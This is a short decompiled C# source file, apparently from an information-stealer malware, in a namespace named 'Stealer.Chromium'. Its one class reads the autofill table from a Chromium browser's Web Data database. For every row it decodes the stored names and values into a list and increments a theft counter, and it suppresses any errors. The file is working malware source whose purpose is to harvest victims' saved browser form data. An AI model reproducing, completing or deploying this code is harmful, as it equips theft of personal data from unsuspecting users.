using System;
using System.Collections.Generic;

namespace Stealer.Chromium
{
	// Token: 0x02000038 RID: 56
	internal sealed class Autofill
	{
		// Token: 0x060000EE RID: 238 RVA: 0x000083EC File Offset: 0x000065EC
		public static List<AutoFill> Get(string sWebData)
		{
			List<AutoFill> result;
			try
			{
				List<AutoFill> list = new List<AutoFill>();
				SQLite sqlite = SqlReader.ReadTable(sWebData, "autofill");
				if (sqlite == null)
				{
					result = list;
				}
				else
				{
					for (int i = 0; i < sqlite.GetRowCount(); i++)
					{
						AutoFill item = default(AutoFill);
						item.sName = Crypto.GetUTF8(sqlite.GetValue(i, 0));
						item.sValue = Crypto.GetUTF8(sqlite.GetValue(i, 1));
						Counter.AutoFill++;
						list.Add(item);
					}
					result = list;
				}
			}
			catch
			{
				result = new List<AutoFill>();
			}
			return result;
		}
	}
}
